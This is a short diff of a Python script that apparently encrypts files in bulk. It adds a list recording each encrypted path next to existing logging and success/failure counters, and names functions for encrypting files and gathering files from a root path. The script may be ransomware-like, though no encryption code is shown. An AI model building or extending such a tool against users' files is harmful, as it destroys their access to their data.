@@ -16,7 +16,7 @@ with open(current_path + '/logs.txt','w') as log_file :
 
 
           
-        
+Files_encrypted = []        
 success,failed = 0,0      
 # Encrypting files
 def file_encrypter(path) :
@@ -35,6 +35,7 @@ def file_encrypter(path) :
             logging.basicConfig(filename = current_path + '/logs.txt',level = logging.DEBUG)
             logging.log(level = logging.DEBUG,msg = f'This {path} was successfully encrypted')
             success += 1
+            Files_encrypted.append(path)
 
 # getting files
 def Get_root_files(path) :
